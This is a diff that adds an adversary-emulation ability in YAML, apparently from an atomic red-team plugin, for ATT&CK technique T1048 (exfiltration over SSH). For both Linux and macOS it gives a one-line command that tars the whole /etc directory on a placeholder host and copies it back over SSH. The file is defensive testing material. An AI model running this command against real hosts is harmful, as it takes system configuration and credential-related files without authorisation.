@@ -1,0 +1,52 @@
+- singleton: false
+  name: Exfiltration Over Alternative Protocol - SSH
+  access: {}
+  tactic: exfiltration
+  requirements: []
+  repeatable: false
+  buckets:
+  - exfiltration
+  additional_info: {}
+  technique_id: T1048
+  privilege: ''
+  delete_payload: true
+  executors:
+  - parsers: []
+    name: sh
+    build_target: null
+    payloads: []
+    timeout: 60
+    variations: []
+    cleanup: []
+    additional_info: {}
+    command: ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+    platform: darwin
+    code: null
+    language: null
+    uploads: []
+  - parsers: []
+    name: sh
+    build_target: null
+    payloads: []
+    timeout: 60
+    variations: []
+    cleanup: []
+    additional_info: {}
+    command: ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+    platform: linux
+    code: null
+    language: null
+    uploads: []
+  technique_name: Exfiltration Over Alternative Protocol
+  plugin: atomic
+  description: 'Input a domain and test Exfiltration over SSH
+
+
+    Remote to Local
+
+
+    Upon successful execution, sh will spawn ssh contacting a remote domain (default:
+    target.example.com) writing a tar.gz file.
+
+    '
+  id: 5ac7f6ec1898d8d408f9cdc687262cc7
